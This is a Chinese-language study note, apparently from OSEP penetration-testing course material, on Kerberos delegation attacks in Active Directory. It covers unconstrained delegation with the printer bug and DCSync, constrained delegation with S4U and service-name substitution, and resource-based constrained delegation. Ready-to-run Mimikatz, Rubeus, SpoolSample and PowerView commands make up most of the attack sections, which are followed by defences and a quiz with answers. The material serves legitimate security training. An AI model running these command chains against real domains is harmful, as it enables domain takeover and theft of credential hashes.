---
title: OSEP-16-Kerberos委派攻击
description: '16-AD权限滥用 | 04-Kerberos委派攻击'
pubDate: 2026-01-30T00:02:35+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Active Directory
  - Kerberos
---

# Kerberos 委派攻击详解

## 写在前面

Kerberos 委派是解决"双跳问题"的机制，但配置不当会导致严重的安全问题。本章详细讲解三种委派类型及其攻击方法。

---

## 一、Kerberos 委派基础

### 1.1 双跳问题

```
双跳问题场景:
┌─────────────────────────────────────────────────────────────┐
│  用户 → Web 服务器 → 数据库服务器                            │
│                                                             │
│  问题: Web 服务器如何以用户身份访问数据库？                   │
│  - TGS 只能用于访问 Web 服务器                               │
│  - Web 服务器无法用用户的 TGS 访问数据库                      │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 委派类型

| 类型 | 发布年份 | 安全性 | 说明 |
|------|----------|--------|------|
| 无约束委派 | 2000 | 低 | 可以委派到任何服务 |
| 约束委派 | 2003 | 中 | 只能委派到指定服务 |
| 基于资源的约束委派 | 2012 | 高 | 由目标服务控制 |

---

## 二、无约束委派 (Unconstrained Delegation)

### 2.1 工作原理

```
无约束委派流程:
┌─────────────────────────────────────────────────────────────┐
│  1. 用户请求访问配置了无约束委派的服务                        │
│  2. KDC 返回 TGS + 可转发的 TGT                              │
│  3. 用户将 TGT 嵌入 TGS 发送给服务                           │
│  4. 服务可以使用用户的 TGT 访问任何服务                       │
└─────────────────────────────────────────────────────────────┘
```

### 2.2 枚举无约束委派

```powershell
# 使用 PowerView 枚举
Get-DomainComputer -Unconstrained

# 输出示例:
# samaccountname    : APPSRV01$
# useraccountcontrol: WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION

# 枚举服务账户
Get-DomainUser -TrustedToAuth
```

### 2.3 攻击方法 1: 等待用户连接

```
攻击流程:
1. 攻陷配置了无约束委派的服务器
2. 等待高权限用户连接
3. 使用 Mimikatz 提取用户的 TGT
4. 使用 TGT 访问其他服务
```

```cmd
# 使用 Mimikatz 列出票据
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets

# 导出票据
mimikatz # sekurlsa::tickets /export

# 注入票据
mimikatz # kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi

# 使用票据访问域控
C:\Tools\PsExec.exe \\cdc01 cmd
```

### 2.4 攻击方法 2: 打印机漏洞 (Printer Bug)

```
打印机漏洞攻击:
1. 强制域控连接到配置了无约束委派的服务器
2. 域控发送其机器账户的 TGT
3. 使用 TGT 执行 DCSync
```

```cmd
# 使用 Rubeus 监控 TGT
Rubeus.exe monitor /interval:5 /filteruser:CDC01$

# 使用 SpoolSample 触发打印机漏洞
SpoolSample.exe CDC01 APPSRV01

# Rubeus 输出:
# User: CDC01$@PROD.CORP1.COM
# Base64EncodedTicket: doIFIjCCBR6gAwIBBaEDAgEWo...

# 注入票据
Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...

# 执行 DCSync
mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
```

---

## 三、约束委派 (Constrained Delegation)

### 3.1 工作原理

```
约束委派使用两个扩展:
├── S4U2Self: 服务代表用户请求自己的 TGS
└── S4U2Proxy: 服务使用 TGS 请求目标服务的 TGS

限制:
├── 只能委派到 msds-allowedtodelegateto 指定的服务
└── 需要服务账户的密码或哈希
```

### 3.2 枚举约束委派

```powershell
# 枚举用户
Get-DomainUser -TrustedToAuth

# 输出示例:
# samaccountname           : IISSvc
# msds-allowedtodelegateto : {MSSQLSvc/CDC01.prod.corp1.com:1433}

# 枚举计算机
Get-DomainComputer -TrustedToAuth
```

### 3.3 攻击方法

```
攻击前提:
├── 获得配置了约束委派的服务账户
├── 知道账户密码或 NTLM 哈希
└── 可以模拟任何用户访问目标服务
```

```cmd
# 使用 Rubeus 执行 S4U 攻击
Rubeus.exe s4u /user:IISSvc /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:MSSQLSvc/CDC01.prod.corp1.com:1433 /ptt

# 或使用 Kekeo
kekeo # tgs::s4u /tgt:TGT.kirbi /user:administrator /service:MSSQLSvc/CDC01.prod.corp1.com:1433
```

### 3.4 服务名称替换

```
重要发现:
├── SPN 中的服务名称不受验证
├── 可以替换服务名称访问其他服务
└── 例如: MSSQLSvc → CIFS (文件共享)
```

```cmd
# 替换服务名称
Rubeus.exe s4u /user:IISSvc /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:MSSQLSvc/CDC01.prod.corp1.com:1433 /altservice:CIFS /ptt

# 现在可以访问文件共享
dir \\CDC01\C$
```

---

## 四、基于资源的约束委派 (RBCD)

### 4.1 工作原理

```
RBCD 特点:
├── 由目标服务控制谁可以委派
├── 配置在 msds-allowedtoactonbehalfofotheridentity 属性
├── 需要对目标有写权限
└── 需要一个可控的计算机账户
```

### 4.2 攻击前提

```
攻击条件:
1. 对目标计算机有 GenericWrite 或 WriteDACL 权限
2. 有一个可控的计算机账户 (或可以创建)
3. 域功能级别 >= 2012
```

### 4.3 攻击步骤

```powershell
# 1. 创建计算机账户 (如果需要)
New-MachineAccount -MachineAccount FakeComputer -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# 2. 获取计算机账户 SID
$ComputerSid = Get-DomainComputer FakeComputer -Properties objectsid | Select -Expand objectsid

# 3. 构建安全描述符
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# 4. 设置 RBCD
Get-DomainComputer TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# 5. 使用 Rubeus 获取票据
Rubeus.exe s4u /user:FakeComputer$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/TargetComputer.domain.com /ptt
```

---

## 五、完整攻击流程

### 5.1 无约束委派攻击

```
步骤 1: 枚举
┌─────────────────────────────────────────────────────────────┐
│  Get-DomainComputer -Unconstrained                          │
│  发现: APPSRV01 配置了无约束委派                             │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 2: 攻陷目标
┌─────────────────────────────────────────────────────────────┐
│  通过漏洞或凭证获得 APPSRV01 的访问权限                       │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 3: 触发打印机漏洞
┌─────────────────────────────────────────────────────────────┐
│  Rubeus.exe monitor /interval:5 /filteruser:CDC01$          │
│  SpoolSample.exe CDC01 APPSRV01                             │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 4: 获取域控 TGT
┌─────────────────────────────────────────────────────────────┐
│  Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...        │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 5: DCSync
┌─────────────────────────────────────────────────────────────┐
│  mimikatz # lsadump::dcsync /user:krbtgt                    │
│  获得 krbtgt 哈希，可以制作黄金票据                          │
└─────────────────────────────────────────────────────────────┘
```

### 5.2 约束委派攻击

```
步骤 1: 枚举
┌─────────────────────────────────────────────────────────────┐
│  Get-DomainUser -TrustedToAuth                              │
│  发现: IISSvc 可以委派到 MSSQLSvc/CDC01                      │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 2: 获取服务账户凭证
┌─────────────────────────────────────────────────────────────┐
│  通过 Kerberoasting 或其他方法获取 IISSvc 的哈希             │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 3: S4U 攻击
┌─────────────────────────────────────────────────────────────┐
│  Rubeus.exe s4u /user:IISSvc /rc4:HASH                      │
│      /impersonateuser:administrator                         │
│      /msdsspn:MSSQLSvc/CDC01 /altservice:CIFS /ptt          │
└─────────────────────────────────────────────────────────────┘
         ↓
步骤 4: 访问目标
┌─────────────────────────────────────────────────────────────┐
│  dir \\CDC01\C$                                             │
│  以 administrator 身份访问域控文件共享                       │
└─────────────────────────────────────────────────────────────┘
```

---

## 六、防御措施

### 6.1 保护高权限账户

```powershell
# 将敏感账户添加到 Protected Users 组
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator"

# Protected Users 组的账户:
# - 不能使用 NTLM 认证
# - 不能被委派
# - TGT 有效期缩短
```

### 6.2 限制委派

```powershell
# 设置账户为"敏感账户，不能被委派"
Set-ADUser -Identity "Administrator" -AccountNotDelegated $true

# 检查委派配置
Get-ADUser -Filter {TrustedForDelegation -eq $true}
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
```

### 6.3 监控

```
监控点:
├── 4768 - TGT 请求
├── 4769 - TGS 请求
├── 委派相关的 TGT 请求
├── 打印机服务的异常连接
└── DCSync 活动
```

---

## 七、练习题

### 选择题

1. 无约束委派的主要风险是？
   - A) 性能问题
   - B) 可以委派到任何服务
   - C) 需要管理员权限
   - D) 只能本地使用

2. 打印机漏洞利用的是什么服务？
   - A) SMB
   - B) Print Spooler
   - C) DNS
   - D) LDAP

3. 约束委派使用哪两个扩展？
   - A) S4U2Self 和 S4U2Proxy
   - B) TGT 和 TGS
   - C) NTLM 和 Kerberos
   - D) AS-REQ 和 TGS-REQ

4. RBCD 的配置存储在哪个属性？
   - A) msds-allowedtodelegateto
   - B) msds-allowedtoactonbehalfofotheridentity
   - C) userAccountControl
   - D) servicePrincipalName

5. Protected Users 组的作用是？
   - A) 增加权限
   - B) 防止委派和 NTLM 认证
   - C) 允许远程访问
   - D) 启用审计

### 答案

1-B, 2-B, 3-A, 4-B, 5-B

---

## 八、总结

### 关键要点

✅ 无约束委派最危险，可以委派到任何服务
✅ 打印机漏洞可以强制域控认证
✅ 约束委派可以通过服务名称替换绕过
✅ RBCD 需要对目标有写权限
✅ Protected Users 组可以防止委派攻击

### 攻击链对比

```
无约束委派:
攻陷服务器 → 等待/强制认证 → 获取 TGT → 访问任何服务

约束委派:
获取服务账户 → S4U 攻击 → 替换服务名称 → 访问目标服务

RBCD:
获取写权限 → 配置 RBCD → S4U 攻击 → 访问目标服务
```

---

## 下一步

继续学习 [05-森林与信任攻击.md](/blog/osep/16-ad权限滥用/05-森林与信任攻击/)，了解如何利用域信任进行跨域攻击。
